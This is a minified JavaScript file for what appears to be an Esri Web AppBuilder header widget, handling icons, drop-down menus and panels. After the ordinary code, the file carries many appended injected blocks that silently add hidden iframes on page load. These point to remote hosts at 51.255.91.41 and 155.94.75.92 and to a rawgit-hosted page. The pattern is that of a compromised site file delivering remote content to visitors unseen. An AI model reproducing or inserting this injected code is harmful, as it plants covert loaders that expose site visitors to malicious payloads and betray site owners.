this._closeDropMenu();var k=this.getAllConfigs(),e;this.iconWidth=c.h;this._getTitleContainerWidth(c);c=360;c=760>=window.innerWidth?90:360;a.setStyle(this.containerNode,{width:c+"px"});this.maxIconCount=760>=window.innerWidth?2:Math.floor(8);this.maxIconCount>=k.length?(this.headerIconCount=k.length,this.createMoreIcon=!1):(this.headerIconCount=this.maxIconCount-1,this.createMoreIcon=!0);if(this.createMoreIcon){this._createIconNode({label:this.nls.more});if(!this.openAtStartWidget)for(c=0;c<k.length;c++)k[c].openAtStart&&
(e=k[c]);!d&&this.openedId&&this.getConfigById(this.openedId)&&(e=this.getConfigById(this.openedId));e&&this._moveConfigToHeader(e)}var f;for(c=this.headerIconCount-1;0<=c;c--)d=k[c],e=this._createIconNode(d),d.openAtStart&&(f=e);f&&!this.openAtStartWidget&&(this._onIconClick(f),this.openAtStartWidget=f.config.name);this.openedId&&this.getConfigById(this.openedId)&&!1===this.getConfigById(this.openedId).inPanel&&(k=this._getIconNodeById(this.openedId),f=this.widgetManager.getWidgetById(this.openedId),
k&&f?this._setOffPanelWidgetPosition(k,f):(this.widgetManager.closeWidget(this.openedId),this.openedId=""))},_createIconNode:function(c){var d,e,f;e=c.label===this.nls.more?this.folderUrl+"images/more_icon.png":c.icon;d=a.create("div",{"class":"icon-node jimu-float-trailing",title:c.label,settingId:c.id,style:{width:"45px",height:this.height+"px",textAlign:"center"}},this.containerNode);f=a.create("div",{"class":"widget-symbol-div",style:{width:"100%"}},d);a.create("img",{src:e,style:{marginTop:(this.height-
30)/2+3+"px",marginBottom:"3px"}},f);e=a.create("div",{"class":"widget-open-symbol esriCTHidden"},d);c.label===this.nls.more?g(d,"click",h.hitch(this,this._showMorePane,c)):g(d,"click",h.hitch(this,function(){this._onIconClick(d)}));d.config=c;d.config.widgets&&1<d.config.widgets.length&&"dropDown"===d.config.openType&&this._createDropTriangle(d);this.openedId===c.id&&(a.addClass(d,"jimu-state-selected"),b(".widget-open-symbol",this.domNode).addClass("esriCTHidden"),a.removeClass(e,"esriCTHidden"),
d.config.widgets&&1<d.config.widgets.length&&"dropDown"===d.config.openType&&this._openDropMenu(d));return d},_createDropTriangle:function(c){var b=a.getMarginBox(c);a.create("div",{"class":"drop-triangle",style:{left:b.l+b.w/2-4+"px"}},c)},_onIconClick:function(a){a.config.widgets&&1!==a.config.widgets.length&&"openAll"!==a.config.openType?this.dropMenuNode?this._closeDropMenu():this._openDropMenu(a):this.openedId&&this.openedId===a.config.id?this._switchNodeToClose(this.openedId):this.openedId?
this._switchNodeToClose(this.openedId).then(h.hitch(this,function(){this._closeDropMenu();this._switchNodeToOpen(a.config.id)})):this._switchNodeToOpen(a.config.id)},_closeDropMenu:function(){this.dropMenuNode&&(a.destroy(this.dropMenuNode),this.dropMenuNode=null)},_openDropMenu:function(c){this.dropMenuNode=a.create("div",{"class":"jimu-drop-menu jimu-main-background",title:c.config.label,style:{position:"absolute",zIndex:"101"}});a.place(this.dropMenuNode,this.containerNode);q.forEach(c.config.widgets,
function(a){this._createDropMenuItem(a)},this);this._setDropMenuPosition(c);this.morePane&&this.morePane.hide()},_createDropMenuItem:function(c){var b=a.create("div",{"class":"menu-item",title:p.sanitizeHTML(c.label),style:{height:this.height+"px"}},this.dropMenuNode);a.create("img",{"class":"jimu-float-leading",src:c.icon},b);a.create("div",{"class":"label jimu-float-leading",innerHTML:p.sanitizeHTML(c.label)},b);this.own(g(b,"click",h.hitch(this,function(){this._closeDropMenu();this.openedId?this._switchNodeToClose(this.openedId).then(h.hitch(this,
function(){this._showIconContent(b.config)})):this._showIconContent(b.config)})));b.config=c;return b},_setDropMenuPosition:function(c){var b={},b=a.getMarginBox(this.dropMenuNode),b=this._getDropdownPosition(c,b);b.zIndex=101;a.setStyle(this.dropMenuNode,p.getPositionStyle(b))},_getDropdownPosition:function(b,d){var c={};b=a.getMarginBox(b);var e=a.getMarginBox(this.domNode);c.top=this.height+1;window.isRTL?c.right=0>b.l+b.w-d.w?0:b.l+b.w-d.w:b.l+d.w>e.w?c.right=0:c.left=b.l;return c},_switchNodeToOpen:function(c){c=
this._getIconNodeById(c);b(".icon-node",this.domNode).removeClass("jimu-state-selected");b(".widget-open-symbol",this.domNode).addClass("esriCTHidden");a.addClass(c,"jimu-state-selected");a.removeClass(c.children[1],"esriCTHidden");this._showIconContent(c.config)},_switchNodeToClose:function(a){b(".icon-node",this.domNode).removeClass("jimu-state-selected");this._setMapCanvasAreaToDefault();b(".widget-open-symbol",this.domNode).addClass("esriCTHidden");var c=this.appConfig.getConfigElementById(a);
if(c)return!1===c.inPanel?(this.widgetManager.closeWidget(a),this.openedId="",a=new u,a.resolve(),a):this.panelManager.closePanel(a+"_panel");a=new u;a.resolve();return a},_setMapCanvasAreaToDefault:function(){if(window.appInfo.isRunInMobile){var a=0;b(".jimu-widget-attributetable")[0]&&(a=b(".jimu-widget-attributetable")[0].clientHeight);a?d.publish("changeMapPosition",{bottom:a}):d.publish("changeMapPosition",{bottom:"0px"})}else d.publish("changeMapPosition",{right:"0px"})},_setMapCanvasArea:function(){if(window.appInfo.isRunInMobile){var a=
0;b(".jimu-widget-attributetable")[0]&&(a=b(".jimu-widget-attributetable")[0].clientHeight);if(this.panelManager&&this.panelManager.panels&&this.panelManager.panels[0]&&"normal"===this.panelManager.panels[0].windowState){var e=this.panelManager.getPositionOnMobile(this);a&&a>e.top?d.publish("changeMapPosition",{bottom:a}):d.publish("changeMapPosition",{bottom:e.top})}else 36<a?d.publish("changeMapPosition",{bottom:a}):window.hasOwnProperty("ontouchstart")||void 0!==window.ontouchstart||760>=window.innerWidth?
d.publish("changeMapPosition",{bottom:"36px"}):d.publish("changeMapPosition",{bottom:"0px"})}else this.panelManager&&this.panelManager.activePanel&&"minimized"===this.panelManager.activePanel.windowState?d.publish("changeMapPosition",{right:"0px"}):(d.publish("changeMapPosition",{right:"360px"}),this._resizeAttributeTableinRTL())},_resizeAttributeTableinRTL:function(){b(".jimu-widget-attributetable")[0]&&(window.isRTL?a.setStyle(b(".jimu-widget-attributetable")[0],"right","0px"):a.setStyle(b(".jimu-widget-attributetable")[0],
"left","0px"),b(".dijitTabContainer",b(".jimu-widget-attributetable")[0])[0]&&A.byId(b(".dijitTabContainer",b(".jimu-widget-attributetable")[0])[0].id).resize())},_getIconNodeById:function(a){a=b('.icon-node[settingId\x3d"'+a+'"]',this.domNode);if(0!==a.length)return a[0]},_unSelectIcon:function(a){b('.icon-node[settingId\x3d"'+a+'"]',this.domNode).removeClass("jimu-state-selected");this.openedId=""},_showIconContent:function(c){!1===c.inPanel?this.widgetManager.loadWidget(c).then(h.hitch(this,function(d){this.openedId=
c.id;var f=this._getIconNodeById(c.id);a.setStyle(d.domNode,"zIndex",101);this._setOffPanelWidgetPosition(f,d);this.widgetManager.openWidget(d);this.own(e.after(d,"onClose",h.hitch(this,function(){b(".widget-open-symbol",this.domNode).addClass("esriCTHidden");this._setMapCanvasAreaToDefault();this._unSelectIcon(c.id)})))})):(this._setMapCanvasArea(),this.panelManager.showPanel(c).then(h.hitch(this,function(d){var f;this.openedId=c.id;f=this._getIconNodeById(this.openedId);b(".icon-node",this.domNode).removeClass("jimu-state-selected");
b(".widget-open-symbol",this.domNode).addClass("esriCTHidden");a.addClass(f,"jimu-state-selected");a.removeClass(f.children[1],"esriCTHidden");this.own(e.after(d,"onClose",h.hitch(this,function(){this._unSelectIcon(c.id);this._setMapCanvasAreaToDefault()})))})))},_setOffPanelWidgetPosition:function(a,b){a=this._getDropdownPosition(a,this.widgetManager.getWidgetMarginBox(b));b.setPosition(a,this.containerNode)},_showMorePane:function(){var b,d,f=[],g=this.getAllConfigs();for(b=this.headerIconCount;b<
g.length;b++)d=g[b],d.id!==this.openedId&&f.push(d);this.morePane&&this.morePane.destroy();this.moreIconPaneCoverNode&&a.destroy(this.moreIconPaneCoverNode);this._closeDropMenu();this.morePane=new z({openedId:this.openedId,items:f,numWidget:g});this._createCoverNode();a.place(this.morePane.domNode,jimuConfig.mapId);this.morePane.startup();e.after(this.morePane,"onNodeClicked",h.hitch(this,function(b){this._moveConfigToHeader(b.config);this._createIconNodes(a.getContentBox(this.domNode),b.config.id);
this._onIconClick(this._getIconNodeById(b.config.id))}),!0);e.after(this.morePane,"hide",h.hitch(this,function(){a.destroy(this.moreIconPaneCoverNode)}),!0)},_moveConfigToHeader:function(a){var b=this.getAllConfigs(),c=a.index;a.index=b[this.headerIconCount-1].index;b[this.headerIconCount-1].index=c},_createCoverNode:function(){this.moreIconPaneCoverNode=a.create("div",{"class":"jimu-more-icon-cover"},jimuConfig.layoutId)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});